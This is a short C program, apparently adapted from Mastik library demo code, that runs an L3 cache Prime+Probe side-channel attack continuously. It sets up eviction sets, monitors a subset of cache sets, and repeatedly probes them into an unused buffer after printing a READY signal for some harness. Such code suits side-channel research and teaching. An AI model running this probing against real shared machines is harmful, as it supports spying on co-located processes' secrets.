/*
 * L3 (LLC) Prime+Probe Attack - Continuous Mode
 * Based on Mastik demo code
 * Runs continuously until Ctrl+C
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

#include <mastik/util.h>
#include <mastik/l3.h>

#define SAMPLES 1000

static volatile int running = 1;

void sigint_handler(int sig) {
    running = 0;
    printf("\nStopping...\n");
}

int main(int ac, char **av) {
    signal(SIGINT, sigint_handler);

    fprintf(stderr, "L3 Prime+Probe Attack (Continuous Mode)\n");
    fprintf(stderr, "Initializing L3 eviction sets...\n");

    // Reduced delay
    delayloop(500000000U);

    l3pp_t l3 = l3_prepare(NULL, NULL);
    if (l3 == NULL) {
        fprintf(stderr, "Failed to prepare L3 probe\n");
        return 1;
    }

    int nsets = l3_getSets(l3);
    int nmonitored = nsets / 64;

    fprintf(stderr, "L3 cache sets: %d, Monitoring: %d sets\n", nsets, nmonitored);

    // Monitor every 64th set starting from set 17
    for (int i = 17; i < nsets; i += 64)
        l3_monitor(l3, i);

    uint16_t *res = calloc(SAMPLES * nmonitored, sizeof(uint16_t));
    if (res == NULL) {
        fprintf(stderr, "Failed to allocate memory\n");
        l3_release(l3);
        return 1;
    }

    // Touch pages
    for (int i = 0; i < SAMPLES * nmonitored; i += 4096/sizeof(uint16_t))
        res[i] = 1;

    // ===== 关键：输出就绪信号 =====
    fprintf(stderr, "Initialization complete.\n");
    fprintf(stderr, "READY\n");
    fflush(stderr);

    fprintf(stderr, "Press Ctrl+C to stop\n\n");

    uint64_t round = 0;
    while (running) {
        l3_repeatedprobe(l3, SAMPLES, res, 0);
        round++;

        if (round % 10 == 0) {
            fprintf(stderr, "\r[Round %lu] Probing %d sets x %d samples    ",
                   round, nmonitored, SAMPLES);
        }
    }

    fprintf(stderr, "\nTotal rounds: %lu\n", round);

    free(res);
    l3_release(l3);

    return 0;
}
